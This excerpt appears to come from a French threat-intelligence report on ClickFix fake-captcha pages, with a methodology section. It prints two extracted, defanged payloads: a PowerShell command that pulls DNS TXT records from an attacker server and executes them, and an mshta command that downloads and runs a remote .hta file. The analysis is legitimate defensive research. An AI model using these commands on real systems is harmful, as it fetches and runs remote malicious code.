## 3. Payloads extraits

### Sample A – Template « House Wiring Scheme » (PowerShell via DNS TXT)
```powershell
powershell -Command "$c=(Resolve-DnsName google[.]com -Type TXT -Server 167[.]17[.]178[.]103 )[.]Strings -join ''; if($c){ cmd \/c $c }"
```

**Analyse statique :**
- La commande force la résolution DNS de `google[.]com` en mode TXT via le serveur DNS contrôlé par l'attaquant (`167[.]17[.]178[.]103`).
- Les enregistrements TXT sont concaténés (`-join ''`) puis exécutés via `cmd /c`.
- Il s'agit d'une technique de **DNS TXT steganography** pour charger du code arbitraire sans écrire directement dans le HTML.

### Sample B – Template « Captcha Security Verification » (MSHTA)
```powershell
mshta hxxps://tmobile[.]pro/p[.]hta
```

**Analyse statique :**
- Bien que le endpoint `/api/cmd` ne retourne pas de PowerShell pur, la commande utilise `mshta[.]exe` pour télécharger et exécuter un fichier `[.]hta` depuis `tmobile[.]pro`.
- MSHTA permet l'exécution de code HTML+JavaScript+VBScript avec les privilèges du navigateur complet, souvent utilisé comme vecteur de dropper.

## 5. Méthodologie

1. **Reconnaissance** : Requête FOFA avec la chaîne empreinte ClickFix fixe (`"Press & hold the Windows Key"`).
2. **Collecte** : Récupération statique (sans exécution JavaScript) des pages d'accueil des 5 assets retournés.
3. **Analyse statique** : Inspection du HTML pour identifier les mécanismes de copie dans le presse-papiers (`navigator[.]clipboard[.]writeText`, `execCommand('copy')`) et les endpoints backend (`command[.]php`, `/api/cmd`).
4. **Extraction des commandes** : Interrogation directe des endpoints backend pour obtenir les payloads réels.
5. **Dédoublonnage** : Regroupement des hôtes partageant le même titre de page et le même payload (Template A).
6. **Defanging** : Tous les IOCs (URLs, IPs, domaines) ont été neutralisés avant publication.
